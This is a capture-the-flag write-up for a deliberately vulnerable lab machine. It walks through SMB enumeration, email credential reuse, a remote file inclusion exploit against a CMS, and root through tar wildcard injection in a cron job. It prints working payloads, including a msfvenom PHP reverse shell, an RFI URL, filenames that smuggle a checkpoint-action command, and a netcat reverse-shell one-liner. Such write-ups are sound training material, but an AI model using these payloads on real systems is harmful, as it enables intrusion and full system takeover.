# Information Gathering


We are given:

> Deploy and compromise the vulnerable machine!

Additonally, we are given the target IP `10.10.13.83`. Our objectives are as follows:

1. Obtain Miles' email password,
2. Identify the hidden directory,
3. Recall the type of vulnerability wherein one includes a remote file for malicious purposes,
4. Obtain the user flag, and
5. Obtain the root flag.


# Enumeration
We run an nmap scan with `nmap -sS -T5 -sC -sV 10.10.13.83` and obtain the following
```bash

We notice SAMBA running on port `445/TCP` and enumerate it using `nmap --script samba-enum-shares.nse -p 445 10.10.13.83`.
This reveals

```bash
Host script results:

```
We notice that we have read and write access on `\\10.10.13.83\anonymous`. Moreover, 
it appears that Miles' personal files are accessible at `\\10.10.13.83\milesdyson`. However, this share is inaccessible without credentials.

On the `anonymous` share, we find a file `attention.txt` containing

```
A recent system malfunction has caused various passwords to be changed. All skynet
employees are required to change their password after seeing this.
-Miles Dyson
```

Additionally, we obtain some log files, which appear to be the history of the password resets mentioned in `attention.txt`.


Afterward, we move on to the web server at port `80/TCP` and fuzz for directories using

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-u http://10.10.13.83/FUZZ -ic
```

This reveals the directory `/squirrelmail`, allowing us to login into Miles' email account. The combination
`MilesDyson:<MOSTRECENTPASSFROMLOGS>` works.

In Miles' inbox, we find the following message

![](/assets/img/skynet/email.png)

This password allows us to authenticate to Miles' SMB share, where we find the file `notes/important.txt`. The
file reads
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
This suggests that there is a directory named `/45kra24zxs28v3yd`. Navigating to `http://10.10.13.83/45kra24zxs28v3yd/` reveals Miles' personal page. The `notes/important.txt` file suggests that there is a login page available, so
we fuzz using 

```bash 
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-u http://10.10.13.83/45kra24zxs28v3yd/FUZZ -ic
```

Consequently, we find a login form at `/45kra24zxs28v3yd/administrator/`.


# Exploitation
After some research, we identify an exploit compatible with this CMS at [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971).

To use this exploit, we first generate a php reverse shell with the command `msfvenom -p php/reverse_php LHOST=10.6.4.176 -o shell.php`. Then, we serve this file using `python3 -m http.server` and start a netcat listener with
`ncat -lvnp 4444`. Finally, we visit the URL 

```
http://10.10.13.83/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?
urlConfig=http://10.6.4.176:8000/shell.php
``` 
and receive a shell as `www-data`. We then obtain the user flag:

# Post-Exploitation
Checking for cron jobs, we execute the command `cat /etc/crontab`, which returns

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
...
```

The first job seems atypical. At `/home/milesdyson/backups/backups.sh`, we find

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

We use wildcard injection to exploit this cron job: first, we `cd /var/www/html`. Then, we run `echo "" > '--checkpoint=1`
and
```bash
echo "" > '--checkpoint-action=exec=bash evil.sh'
``` 

Lastly, we write a reverse shell `evil.sh` using

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.4.176 1234 > /tmp/f" 
> evil.sh
```

After setting up a netcat listener with the command `ncat -lvnp 1234`,
we receive a shell as `root`.

We then obtain the root flag:
